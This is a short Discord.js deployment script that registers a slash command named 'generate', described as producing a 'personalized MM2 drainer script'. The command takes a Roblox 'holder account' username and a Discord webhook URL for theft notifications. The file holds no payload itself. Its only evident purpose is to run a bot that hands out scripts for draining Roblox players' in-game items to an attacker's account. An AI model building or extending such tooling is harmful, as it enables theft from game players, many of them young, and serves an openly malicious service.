// file: deploy.js — run once to register slash command
import { REST, Routes, SlashCommandBuilder } from "discord.js";
import "dotenv/config";

const commands = [
  new SlashCommandBuilder()
    .setName("generate")
    .setDescription("Generate a personalized MM2 drainer script")
    .addStringOption((o) =>
      o
        .setName("holder")
        .setDescription("Your Roblox holder account username")
        .setRequired(true)
    )
    .addStringOption((o) =>
      o
        .setName("webhook")
        .setDescription("Your Discord webhook URL for notifications")
        .setRequired(true)
    )
    .toJSON(),
];

const rest = new REST().setToken(process.env.BOT_TOKEN);

await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), {
  body: commands,
});

console.log("Slash command registered.");
